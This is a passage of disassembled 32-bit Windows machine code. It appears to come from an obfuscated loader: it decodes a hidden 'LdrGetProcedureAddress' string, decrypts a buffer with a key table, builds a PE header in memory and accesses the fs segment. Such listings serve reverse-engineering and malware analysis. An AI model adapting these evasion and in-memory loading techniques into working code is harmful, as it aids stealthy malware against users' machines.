  40242b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40242e:	8b 55 08             	mov    0x8(%ebp),%edx
  402431:	31 f6                	xor    %esi,%esi
  402433:	3d 00 00 00 00       	cmp    $0x0,%eax
  402438:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40243b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40243e:	89 55 ec             	mov    %edx,-0x14(%ebp)
  402441:	89 75 e8             	mov    %esi,-0x18(%ebp)
  402444:	74 1e                	je     0x402464
  402446:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402449:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40244c:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  40244f:	8b 75 ec             	mov    -0x14(%ebp),%esi
  402452:	88 14 06             	mov    %dl,(%esi,%eax,1)
  402455:	05 01 00 00 00       	add    $0x1,%eax
  40245a:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40245d:	39 f8                	cmp    %edi,%eax
  40245f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402462:	75 e2                	jne    0x402446
  402464:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402467:	83 c4 10             	add    $0x10,%esp
  40246a:	5e                   	pop    %esi
  40246b:	5f                   	pop    %edi
  40246c:	5d                   	pop    %ebp
  40246d:	c3                   	ret
  40246e:	55                   	push   %ebp
  40246f:	89 e5                	mov    %esp,%ebp
  402471:	57                   	push   %edi
  402472:	56                   	push   %esi
  402473:	83 ec 2c             	sub    $0x2c,%esp
  402476:	8b 45 0c             	mov    0xc(%ebp),%eax
  402479:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40247c:	31 d2                	xor    %edx,%edx
  40247e:	be 58 00 00 00       	mov    $0x58,%esi
  402483:	8b 79 4c             	mov    0x4c(%ecx),%edi
  402486:	89 7d e0             	mov    %edi,-0x20(%ebp)
  402489:	8b 79 48             	mov    0x48(%ecx),%edi
  40248c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40248f:	8b 79 54             	mov    0x54(%ecx),%edi
  402492:	89 7d e8             	mov    %edi,-0x18(%ebp)
  402495:	8b 79 34             	mov    0x34(%ecx),%edi
  402498:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40249b:	8b 79 1c             	mov    0x1c(%ecx),%edi
  40249e:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4024a1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4024a4:	89 0c 24             	mov    %ecx,(%esp)
  4024a7:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4024ae:	00 
  4024af:	c7 44 24 08 58 00 00 	movl   $0x58,0x8(%esp)
  4024b6:	00 
  4024b7:	89 75 dc             	mov    %esi,-0x24(%ebp)
  4024ba:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4024bd:	e8 8b fc ff ff       	call   0x40214d
  4024c2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4024c5:	8b 30                	mov    (%eax),%esi
  4024c7:	8b 78 04             	mov    0x4(%eax),%edi
  4024ca:	8b 58 08             	mov    0x8(%eax),%ebx
  4024cd:	8b 68 0c             	mov    0xc(%eax),%ebp
  4024d0:	8b 60 10             	mov    0x10(%eax),%esp
  4024d3:	8b 40 14             	mov    0x14(%eax),%eax
  4024d6:	ff e0                	jmp    *%eax
  4024d8:	83 c4 2c             	add    $0x2c,%esp
  4024db:	5e                   	pop    %esi
  4024dc:	5f                   	pop    %edi
  4024dd:	5d                   	pop    %ebp
  4024de:	c3                   	ret
  4024df:	55                   	push   %ebp
  4024e0:	89 e5                	mov    %esp,%ebp
  4024e2:	31 c0                	xor    %eax,%eax
  4024e4:	5d                   	pop    %ebp
  4024e5:	c3                   	ret
  4024e6:	55                   	push   %ebp
  4024e7:	89 e5                	mov    %esp,%ebp
  4024e9:	53                   	push   %ebx
  4024ea:	57                   	push   %edi
  4024eb:	56                   	push   %esi
  4024ec:	83 e4 f8             	and    $0xfffffff8,%esp
  4024ef:	83 ec 60             	sub    $0x60,%esp
  4024f2:	8b 45 0c             	mov    0xc(%ebp),%eax
  4024f5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4024f8:	31 d2                	xor    %edx,%edx
  4024fa:	8a 1d 00 40 40 00    	mov    0x404000,%bl
  402500:	80 fb 00             	cmp    $0x0,%bl
  402503:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402507:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  40250b:	89 54 24 24          	mov    %edx,0x24(%esp)
  40250f:	88 5c 24 23          	mov    %bl,0x23(%esp)
  402513:	75 7d                	jne    0x402592
  402515:	8b 44 24 24          	mov    0x24(%esp),%eax
  402519:	8d 4c 24 32          	lea    0x32(%esp),%ecx
  40251d:	c6 44 04 32 00       	movb   $0x0,0x32(%esp,%eax,1)
  402522:	89 0c 24             	mov    %ecx,(%esp)
  402525:	e8 de f5 ff ff       	call   0x401b08
  40252a:	31 c9                	xor    %ecx,%ecx
  40252c:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  402530:	89 54 24 54          	mov    %edx,0x54(%esp)
  402534:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402538:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40253c:	e9 82 00 00 00       	jmp    0x4025c3
  402541:	8b 44 24 14          	mov    0x14(%esp),%eax
  402545:	66 89 c1             	mov    %ax,%cx
  402548:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40254c:	66 89 4c 24 50       	mov    %cx,0x50(%esp)
  402551:	66 89 4c 24 52       	mov    %cx,0x52(%esp)
  402556:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%esp)
  40255d:	00 
  40255e:	89 e6                	mov    %esp,%esi
  402560:	8d 7c 24 58          	lea    0x58(%esp),%edi
  402564:	89 7e 0c             	mov    %edi,0xc(%esi)
  402567:	8d 7c 24 50          	lea    0x50(%esp),%edi
  40256b:	89 7e 04             	mov    %edi,0x4(%esi)
  40256e:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402572:	89 3e                	mov    %edi,(%esi)
  402574:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40257b:	ff d2                	call   *%edx
  40257d:	83 ec 10             	sub    $0x10,%esp
  402580:	8b 54 24 58          	mov    0x58(%esp),%edx
  402584:	89 44 24 10          	mov    %eax,0x10(%esp)
  402588:	89 d0                	mov    %edx,%eax
  40258a:	8d 65 f4             	lea    -0xc(%ebp),%esp
  40258d:	5e                   	pop    %esi
  40258e:	5f                   	pop    %edi
  40258f:	5b                   	pop    %ebx
  402590:	5d                   	pop    %ebp
  402591:	c3                   	ret
  402592:	8b 44 24 24          	mov    0x24(%esp),%eax
  402596:	8a 4c 24 23          	mov    0x23(%esp),%cl
  40259a:	80 c1 85             	add    $0x85,%cl
  40259d:	89 c2                	mov    %eax,%edx
  40259f:	81 c2 01 00 00 00    	add    $0x1,%edx
  4025a5:	88 4c 04 32          	mov    %cl,0x32(%esp,%eax,1)
  4025a9:	8a 0c 05 01 40 40 00 	mov    0x404001(,%eax,1),%cl
  4025b0:	80 f9 00             	cmp    $0x0,%cl
  4025b3:	89 54 24 24          	mov    %edx,0x24(%esp)
  4025b7:	88 4c 24 23          	mov    %cl,0x23(%esp)
  4025bb:	0f 84 54 ff ff ff    	je     0x402515
  4025c1:	eb cf                	jmp    0x402592
  4025c3:	8b 44 24 18          	mov    0x18(%esp),%eax
  4025c7:	89 c1                	mov    %eax,%ecx
  4025c9:	81 c1 01 00 00 00    	add    $0x1,%ecx
  4025cf:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4025d3:	80 3c 02 00          	cmpb   $0x0,(%edx,%eax,1)
  4025d7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4025db:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4025df:	0f 84 5c ff ff ff    	je     0x402541
  4025e5:	eb dc                	jmp    0x4025c3
  4025e7:	55                   	push   %ebp
  4025e8:	89 e5                	mov    %esp,%ebp
  4025ea:	83 ec 0c             	sub    $0xc,%esp
  4025ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4025f0:	3d 01 00 10 00       	cmp    $0x100001,%eax
  4025f5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4025f8:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4025fb:	73 0f                	jae    0x40260c
  4025fd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402600:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402603:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402606:	64 8b 11             	mov    %fs:(%ecx),%edx
  402609:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40260c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40260f:	83 c4 0c             	add    $0xc,%esp
  402612:	5d                   	pop    %ebp
  402613:	c3                   	ret
  402614:	55                   	push   %ebp
  402615:	89 e5                	mov    %esp,%ebp
  402617:	56                   	push   %esi
  402618:	83 ec 0c             	sub    $0xc,%esp
  40261b:	8b 45 08             	mov    0x8(%ebp),%eax
  40261e:	31 c9                	xor    %ecx,%ecx
  402620:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402623:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402626:	eb 00                	jmp    0x402628
  402628:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40262b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40262e:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  402631:	89 c6                	mov    %eax,%esi
  402633:	81 c6 01 00 00 00    	add    $0x1,%esi
  402639:	80 fa 00             	cmp    $0x0,%dl
  40263c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40263f:	89 75 f4             	mov    %esi,-0xc(%ebp)
  402642:	75 e4                	jne    0x402628
  402644:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402647:	83 c4 0c             	add    $0xc,%esp
  40264a:	5e                   	pop    %esi
  40264b:	5d                   	pop    %ebp
  40264c:	c3                   	ret
  40264d:	55                   	push   %ebp
  40264e:	89 e5                	mov    %esp,%ebp
  402650:	83 ec 08             	sub    $0x8,%esp
  402653:	89 e0                	mov    %esp,%eax
  402655:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40265c:	c7 00 14 30 40 00    	movl   $0x403014,(%eax)
  402662:	e8 1c f6 ff ff       	call   0x401c83
  402667:	83 c4 08             	add    $0x8,%esp
  40266a:	5d                   	pop    %ebp
  40266b:	c3                   	ret
  40266c:	55                   	push   %ebp
  40266d:	89 e5                	mov    %esp,%ebp
  40266f:	31 c0                	xor    %eax,%eax
  402671:	5d                   	pop    %ebp
  402672:	c3                   	ret
  402673:	55                   	push   %ebp
  402674:	89 e5                	mov    %esp,%ebp
  402676:	8b 45 08             	mov    0x8(%ebp),%eax
  402679:	8b 0d 1c 44 40 00    	mov    0x40441c,%ecx
  40267f:	81 c1 6a 08 00 00    	add    $0x86a,%ecx
  402685:	66 c7 00 4d 5a       	movw   $0x5a4d,(%eax)
  40268a:	c7 40 3c c0 00 00 00 	movl   $0xc0,0x3c(%eax)
  402691:	c7 80 c0 00 00 00 50 	movl   $0x4550,0xc0(%eax)
  402698:	45 00 00 
  40269b:	66 c7 80 c4 00 00 00 	movw   $0x14c,0xc4(%eax)
  4026a2:	4c 01 
  4026a4:	66 c7 80 c6 00 00 00 	movw   $0x3,0xc6(%eax)
  4026ab:	03 00 
  4026ad:	66 c7 80 d4 00 00 00 	movw   $0xe0,0xd4(%eax)
  4026b4:	e0 00 
  4026b6:	c7 80 e8 00 00 00 a0 	movl   $0xeea0,0xe8(%eax)
  4026bd:	ee 00 00 
  4026c0:	66 c7 80 d8 00 00 00 	movw   $0x10b,0xd8(%eax)
  4026c7:	0b 01 
  4026c9:	89 0d 18 44 40 00    	mov    %ecx,0x404418
  4026cf:	5d                   	pop    %ebp
  4026d0:	c3                   	ret
  4026d1:	55                   	push   %ebp
  4026d2:	89 e5                	mov    %esp,%ebp
  4026d4:	53                   	push   %ebx
  4026d5:	57                   	push   %edi
  4026d6:	56                   	push   %esi
  4026d7:	83 ec 14             	sub    $0x14,%esp
  4026da:	8b 45 10             	mov    0x10(%ebp),%eax
  4026dd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4026e0:	8b 55 08             	mov    0x8(%ebp),%edx
  4026e3:	31 f6                	xor    %esi,%esi
  4026e5:	3d 00 00 00 00       	cmp    $0x0,%eax
  4026ea:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4026ed:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4026f0:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4026f3:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4026f6:	74 37                	je     0x40272f
  4026f8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4026fb:	b9 a2 00 00 00       	mov    $0xa2,%ecx
  402700:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402703:	31 d2                	xor    %edx,%edx
  402705:	f7 f1                	div    %ecx
  402707:	8a 1c 15 4f 30 40 00 	mov    0x40304f(,%edx,1),%bl
  40270e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402711:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402714:	8a 3c 11             	mov    (%ecx,%edx,1),%bh
  402717:	28 df                	sub    %bl,%bh
  402719:	8b 75 e8             	mov    -0x18(%ebp),%esi
  40271c:	88 3c 16             	mov    %bh,(%esi,%edx,1)
  40271f:	81 c2 01 00 00 00    	add    $0x1,%edx
  402725:	8b 7d f0             	mov    -0x10(%ebp),%edi
  402728:	39 fa                	cmp    %edi,%edx
  40272a:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40272d:	75 c9                	jne    0x4026f8
  40272f:	83 c4 14             	add    $0x14,%esp
  402732:	5e                   	pop    %esi
  402733:	5f                   	pop    %edi
  402734:	5b                   	pop    %ebx
  402735:	5d                   	pop    %ebp
  402736:	c3                   	ret

Disassembly of section .data:

00404000 <.data>:
  404000:	c7                   	(bad)
  404001:	df ed                	fucomip %st(5),%st
  404003:	c2 e0 ef             	ret    $0xefe0
  404006:	cb                   	lret
  404007:	ed                   	in     (%dx),%eax
  404008:	ea de e0 df f0 ed e0 	ljmp   $0xe0ed,$0xf0dfe0de
  40400f:	bc df df ed e0       	mov    $0xe0eddfdf,%esp
  404014:	ee                   	out    %al,(%dx)
  404015:	ee                   	out    %al,(%dx)
  404016:	00 00                	add    %al,(%eax)
  404018:	2e 30 40 00          	xor    %al,%cs:0x0(%eax)
  40401c:	be 00 00 00 62       	mov    $0x62000000,%esi
  404021:	00 00                	add    %al,(%eax)
  404023:	00 8a 00 00 00 a6    	add    %cl,-0x5a000000(%edx)
  404029:	00 00                	add    %al,(%eax)
  40402b:	00 04 00             	add    %al,(%eax,%eax,1)
  40402e:	00 00                	add    %al,(%eax)
  404030:	17                   	pop    %ss
  404031:	00 00                	add    %al,(%eax)
  404033:	00 1f                	add    %bl,(%edi)
  404035:	00 00                	add    %al,(%eax)
  404037:	00 3e                	add    %bh,(%esi)
  404039:	00 00                	add    %al,(%eax)
  40403b:	00 2d 00 00 00 d4    	add    %ch,0xd4000000
  404041:	00 00                	add    %al,(%eax)
  404043:	00 7d 00             	add    %bh,0x0(%ebp)
  404046:	00 00                	add    %al,(%eax)
  404048:	e9 00 00 00 30       	jmp    0x3040404d
  40404d:	00 00                	add    %al,(%eax)
  40404f:	00 c0                	add    %al,%al
  404051:	00 00                	add    %al,(%eax)
  404053:	00 49 00             	add    %cl,0x0(%ecx)
  404056:	00 00                	add    %al,(%eax)
  404058:	66 00 00             	data16 add %al,(%eax)
  40405b:	00 85 00 00 00 6c    	add    %al,0x6c000000(%ebp)
  404061:	00 00                	add    %al,(%eax)
  404063:	00 de                	add    %bl,%dh
  404065:	00 00                	add    %al,(%eax)
  404067:	00 5d 00             	add    %bl,0x0(%ebp)
  40406a:	00 00                	add    %al,(%eax)
  40406c:	1d 00 00 00 09       	sbb    $0x9000000,%eax
  404071:	00 00                	add    %al,(%eax)
  404073:	00 a4 00 00 00 90 00 	add    %ah,0x900000(%eax,%eax,1)
  40407a:	00 00                	add    %al,(%eax)
  40407c:	9f                   	lahf
  40407d:	00 00                	add    %al,(%eax)
  40407f:	00 4f 00             	add    %cl,0x0(%edi)
  404082:	00 00                	add    %al,(%eax)
  404084:	db 00                	fildl  (%eax)
  404086:	00 00                	add    %al,(%eax)
  404088:	88 00                	mov    %al,(%eax)
  40408a:	00 00                	add    %al,(%eax)
  40408c:	06                   	push   %es
  40408d:	00 00                	add    %al,(%eax)
  40408f:	00 9c 00 00 00 03 00 	add    %bl,0x30000(%eax,%eax,1)
  404096:	00 00                	add    %al,(%eax)
  404098:	dd 00                	fldl   (%eax)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	f4                   	hlt
  40409d:	00 00                	add    %al,(%eax)
  40409f:	00 d8                	add    %bl,%al
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	00 b4 00 00 00 f0 00 	add    %dh,0xf00000(%eax,%eax,1)
  4040aa:	00 00                	add    %al,(%eax)
  4040ac:	9e                   	sahf
  4040ad:	00 00                	add    %al,(%eax)
  4040af:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4040b3:	00 a3 00 00 00 a1    	add    %ah,-0x5f000000(%ebx)
  4040b9:	00 00                	add    %al,(%eax)
  4040bb:	00 24 00             	add    %ah,(%eax,%eax,1)
  4040be:	00 00                	add    %al,(%eax)
  4040c0:	77 00                	ja     0x4040c2
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	c6 00 00             	movb   $0x0,(%eax)
  4040c7:	00 c3                	add    %al,%bl
  4040c9:	00 00                	add    %al,(%eax)
  4040cb:	00 cc                	add    %cl,%ah
  4040cd:	00 00                	add    %al,(%eax)
  4040cf:	00 2f                	add    %ch,(%edi)
  4040d1:	00 00                	add    %al,(%eax)
  4040d3:	00 a9 00 00 00 73    	add    %ch,0x73000000(%ecx)
  4040d9:	00 00                	add    %al,(%eax)
  4040db:	00 45 00             	add    %al,0x0(%ebp)
  4040de:	00 00                	add    %al,(%eax)
  4040e0:	ef                   	out    %eax,(%dx)
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	00 38                	add    %bh,(%eax)
  4040e5:	00 00                	add    %al,(%eax)
  4040e7:	00 67 00             	add    %ah,0x0(%edi)
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	40                   	inc    %eax
  4040ed:	00 00                	add    %al,(%eax)
  4040ef:	00 ba 00 00 00 37    	add    %bh,0x37000000(%edx)
  4040f5:	00 00                	add    %al,(%eax)
  4040f7:	00 f1                	add    %dh,%cl
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 ad 00 00 00 0d    	add    %ch,0xd000000(%ebp)
  404101:	00 00                	add    %al,(%eax)
  404103:	00 89 00 00 00 79    	add    %cl,0x79000000(%ecx)
  404109:	00 00                	add    %al,(%eax)
  40410b:	00 05 00 00 00 c8    	add    %al,0xc8000000
  404111:	00 00                	add    %al,(%eax)
  404113:	00 71 00             	add    %dh,0x0(%ecx)
  404116:	00 00                	add    %al,(%eax)
  404118:	93                   	xchg   %eax,%ebx
  404119:	00 00                	add    %al,(%eax)
  40411b:	00 8d 00 00 00 0f    	add    %cl,0xf000000(%ebp)
  404121:	00 00                	add    %al,(%eax)
  404123:	00 df                	add    %bl,%bh
  404125:	00 00                	add    %al,(%eax)
  404127:	00 7b 00             	add    %bh,0x0(%ebx)
  40412a:	00 00                	add    %al,(%eax)
  40412c:	e3 00                	jecxz  0x40412e
  40412e:	00 00                	add    %al,(%eax)
  404130:	16                   	push   %ss
  404131:	00 00                	add    %al,(%eax)
  404133:	00 b6 00 00 00 7a    	add    %dh,0x7a000000(%esi)
  404139:	00 00                	add    %al,(%eax)
  40413b:	00 4a 00             	add    %cl,0x0(%edx)
  40413e:	00 00                	add    %al,(%eax)
  404140:	fc                   	cld
  404141:	00 00                	add    %al,(%eax)
  404143:	00 4b 00             	add    %cl,0x0(%ebx)
  404146:	00 00                	add    %al,(%eax)
  404148:	83 00 00             	addl   $0x0,(%eax)
  40414b:	00 cd                	add    %cl,%ch
  40414d:	00 00                	add    %al,(%eax)
  40414f:	00 e5                	add    %ah,%ch
  404151:	00 00                	add    %al,(%eax)
  404153:	00 98 00 00 00 20    	add    %bl,0x20000000(%eax)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 3b                	add    %bh,(%ebx)
  40415d:	00 00                	add    %al,(%eax)
  40415f:	00 c5                	add    %al,%ch
  404161:	00 00                	add    %al,(%eax)
  404163:	00 4d 00             	add    %cl,0x0(%ebp)
  404166:	00 00                	add    %al,(%eax)
  404168:	2e 00 00             	add    %al,%cs:(%eax)
  40416b:	00 ce                	add    %cl,%dh
  40416d:	00 00                	add    %al,(%eax)
  40416f:	00 32                	add    %dh,(%edx)
  404171:	00 00                	add    %al,(%eax)
  404173:	00 fd                	add    %bh,%ch
  404175:	00 00                	add    %al,(%eax)
  404177:	00 a2 00 00 00 87    	add    %ah,-0x79000000(%edx)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	00 5b 00             	add    %bl,0x0(%ebx)
  404182:	00 00                	add    %al,(%eax)
  404184:	42                   	inc    %edx
  404185:	00 00                	add    %al,(%eax)
  404187:	00 27                	add    %ah,(%edi)
  404189:	00 00                	add    %al,(%eax)
  40418b:	00 82 00 00 00 11    	add    %al,0x11000000(%edx)
  404191:	00 00                	add    %al,(%eax)
  404193:	00 02                	add    %al,(%edx)
  404195:	00 00                	add    %al,(%eax)
  404197:	00 f3                	add    %dh,%bl
  404199:	00 00                	add    %al,(%eax)
  40419b:	00 3f                	add    %bh,(%edi)
  40419d:	00 00                	add    %al,(%eax)
  40419f:	00 c7                	add    %al,%bh
  4041a1:	00 00                	add    %al,(%eax)
  4041a3:	00 8e 00 00 00 e0    	add    %cl,-0x20000000(%esi)
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	00 cf                	add    %cl,%bh
  4041ad:	00 00                	add    %al,(%eax)
  4041af:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  4041b3:	00 18                	add    %bl,(%eax)
  4041b5:	00 00                	add    %al,(%eax)
  4041b7:	00 c1                	add    %al,%cl
  4041b9:	00 00                	add    %al,(%eax)
  4041bb:	00 d6                	add    %dl,%dh
  4041bd:	00 00                	add    %al,(%eax)
  4041bf:	00 bf 00 00 00 d1    	add    %bh,-0x2f000000(%edi)
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4041cb:	00 63 00             	add    %ah,0x0(%ebx)
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	aa                   	stos   %al,%es:(%edi)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	00 fe                	add    %bh,%dh
  4041d5:	00 00                	add    %al,(%eax)
  4041d7:	00 d5                	add    %dl,%ch
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	00 6d 00             	add    %ch,0x0(%ebp)
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	c4 00                	les    (%eax),%eax
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	b8 00 00 00 e2       	mov    $0xe2000000,%eax
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	00 af 00 00 00 10    	add    %ch,0x10000000(%edi)
  4041f1:	00 00                	add    %al,(%eax)
  4041f3:	00 19                	add    %bl,(%ecx)
  4041f5:	00 00                	add    %al,(%eax)
  4041f7:	00 bc 00 00 00 3c 00 	add    %bh,0x3c0000(%eax,%eax,1)
  4041fe:	00 00                	add    %al,(%eax)
  404200:	f7 00 00 00 bb 00    	testl  $0xbb0000,(%eax)
  404206:	00 00                	add    %al,(%eax)
  404208:	01 00                	add    %eax,(%eax)
  40420a:	00 00                	add    %al,(%eax)
  40420c:	ec                   	in     (%dx),%al
  40420d:	00 00                	add    %al,(%eax)
  40420f:	00 92 00 00 00 4e    	add    %dl,0x4e000000(%edx)
  404215:	00 00                	add    %al,(%eax)
  404217:	00 da                	add    %bl,%dl
  404219:	00 00                	add    %al,(%eax)
  40421b:	00 ca                	add    %cl,%dl
  40421d:	00 00                	add    %al,(%eax)
  40421f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404222:	00 00                	add    %al,(%eax)
  404224:	51                   	push   %ecx
  404225:	00 00                	add    %al,(%eax)
  404227:	00 0e                	add    %cl,(%esi)
  404229:	00 00                	add    %al,(%eax)
  40422b:	00 15 00 00 00 3a    	add    %dl,0x3a000000
  404231:	00 00                	add    %al,(%eax)
  404233:	00 56 00             	add    %dl,0x0(%esi)
  404236:	00 00                	add    %al,(%eax)
  404238:	13 00                	adc    (%eax),%eax
  40423a:	00 00                	add    %al,(%eax)
  40423c:	61                   	popa
  40423d:	00 00                	add    %al,(%eax)
  40423f:	00 dc                	add    %bl,%ah
  404241:	00 00                	add    %al,(%eax)
  404243:	00 29                	add    %ch,(%ecx)
  404245:	00 00                	add    %al,(%eax)
  404247:	00 6a 00             	add    %ch,0x0(%edx)
  40424a:	00 00                	add    %al,(%eax)
  40424c:	2b 00                	sub    (%eax),%eax
  40424e:	00 00                	add    %al,(%eax)
  404250:	25 00 00 00 ac       	and    $0xac000000,%eax
  404255:	00 00                	add    %al,(%eax)
  404257:	00 f8                	add    %bh,%al
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 5e 00             	add    %bl,0x0(%esi)
  40425e:	00 00                	add    %al,(%eax)
  404260:	d3 00                	roll   %cl,(%eax)
  404262:	00 00                	add    %al,(%eax)
  404264:	b9 00 00 00 6e       	mov    $0x6e000000,%ecx
  404269:	00 00                	add    %al,(%eax)
  40426b:	00 8c 00 00 00 07 00 	add    %cl,0x70000(%eax,%eax,1)
  404272:	00 00                	add    %al,(%eax)
  404274:	00 00                	add    %al,(%eax)
  404276:	00 00                	add    %al,(%eax)
  404278:	f2 00 00             	repnz add %al,(%eax)
  40427b:	00 69 00             	add    %ch,0x0(%ecx)
  40427e:	00 00                	add    %al,(%eax)
  404280:	59                   	pop    %ecx
  404281:	00 00                	add    %al,(%eax)
  404283:	00 ea                	add    %ch,%dl
  404285:	00 00                	add    %al,(%eax)
  404287:	00 36                	add    %dh,(%esi)
  404289:	00 00                	add    %al,(%eax)
  40428b:	00 e1                	add    %ah,%cl
  40428d:	00 00                	add    %al,(%eax)
  40428f:	00 34 00             	add    %dh,(%eax,%eax,1)
  404292:	00 00                	add    %al,(%eax)
  404294:	9d                   	popf
  404295:	00 00                	add    %al,(%eax)
  404297:	00 cb                	add    %cl,%bl
  404299:	00 00                	add    %al,(%eax)
  40429b:	00 26                	add    %ah,(%esi)
  40429d:	00 00                	add    %al,(%eax)
  40429f:	00 75 00             	add    %dh,0x0(%ebp)
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	d9 00                	flds   (%eax)
  4042a6:	00 00                	add    %al,(%eax)
  4042a8:	47                   	inc    %edi
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	00 ee                	add    %ch,%dh
  4042ad:	00 00                	add    %al,(%eax)
  4042af:	00 58 00             	add    %bl,0x0(%eax)
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	50                   	push   %eax
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4042ba:	00 00                	add    %al,(%eax)
  4042bc:	e4 00                	in     $0x0,%al
  4042be:	00 00                	add    %al,(%eax)
  4042c0:	0b 00                	or     (%eax),%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	b7 00                	mov    $0x0,%bh
  4042c6:	00 00                	add    %al,(%eax)
  4042c8:	53                   	push   %ebx
  4042c9:	00 00                	add    %al,(%eax)
  4042cb:	00 65 00             	add    %ah,0x0(%ebp)
  4042ce:	00 00                	add    %al,(%eax)
  4042d0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	00 5a 00             	add    %bl,0x0(%edx)
  4042d6:	00 00                	add    %al,(%eax)
  4042d8:	2c 00                	sub    $0x0,%al
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	91                   	xchg   %eax,%ecx
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	00 d2                	add    %dl,%dl
  4042e1:	00 00                	add    %al,(%eax)
  4042e3:	00 b2 00 00 00 7c    	add    %dh,0x7c000000(%edx)
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	00 6f 00             	add    %ch,0x0(%edi)
  4042ee:	00 00                	add    %al,(%eax)
  4042f0:	22 00                	and    (%eax),%al
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	86 00                	xchg   %al,(%eax)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	31 00                	xor    %eax,(%eax)
  4042fa:	00 00                	add    %al,(%eax)
  4042fc:	f6 00 00             	testb  $0x0,(%eax)
  4042ff:	00 b0 00 00 00 70    	add    %dh,0x70000000(%eax)
  404305:	00 00                	add    %al,(%eax)
  404307:	00 d7                	add    %dl,%bh
  404309:	00 00                	add    %al,(%eax)
  40430b:	00 e6                	add    %ah,%dh
  40430d:	00 00                	add    %al,(%eax)
  40430f:	00 1e                	add    %bl,(%esi)
  404311:	00 00                	add    %al,(%eax)
  404313:	00 08                	add    %cl,(%eax)
  404315:	00 00                	add    %al,(%eax)
  404317:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40431b:	00 46 00             	add    %al,0x0(%esi)
  40431e:	00 00                	add    %al,(%eax)
  404320:	ae                   	scas   %es:(%edi),%al
  404321:	00 00                	add    %al,(%eax)
